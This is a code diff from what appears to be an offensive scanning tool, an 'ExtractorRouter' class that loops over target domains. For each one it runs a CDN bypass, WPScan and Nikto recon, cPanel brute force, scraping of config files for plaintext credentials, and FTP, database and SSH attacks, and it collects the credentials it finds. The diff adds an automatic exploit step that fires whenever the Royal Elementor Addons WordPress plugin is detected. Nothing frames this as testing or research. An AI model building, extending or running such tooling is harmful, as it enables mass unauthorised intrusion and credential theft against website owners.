@@ -20,13 +20,6 @@ class ExtractorRouter:
         self.found_credentials = {}  # domain_id -> list of (user, pass)
 
     def run(self):
-        """Iterate all targets running extractors in priority order:
-        1. CDN bypass
-        2. WPScan + Nikto (recon — find vulns, plugins, exposed files)
-        3. cPanel brute force (fast, gives full access)
-        4. Config scraper (find plaintext creds in exposed files)
-        5. FTP / MySQL / PostgreSQL / SSH
-        """
         for domain_id, data in list(self.results.items()):
             ip = data['ip']
             host = data['host']
@@ -35,12 +28,17 @@ class ExtractorRouter:
             # 1. CDN bypass
             self._run_cdn_bypass(domain_id, ip, host)
 
-            # 2. Web recon (WPScan + Nikto) — runs before any brute force
+            # 2. Web recon (WPScan + Nikto)
             if self._has_port(data, 80) or self._has_port(data, 443):
                 port = 443 if self._has_port(data, 443) else 80
                 www_host = f"www.{host}" if not host.startswith('www.') else host
                 self._run_wpscan(domain_id, ip, www_host, port)
                 self._run_nikto(domain_id, ip, www_host, port)
+
+            # 2.5 Exploit Royal Elementor if detected by WPScan
+            wpscan = self.results[domain_id].get('wpscan', {})
+            if 'royal-elementor-addons' in wpscan.get('plugins', {}):
+                self._run_royal_elementor_exploit(domain_id, ip, www_host, port)
 
             # 3. cPanel brute force
             if self._has_port(data, 2083):
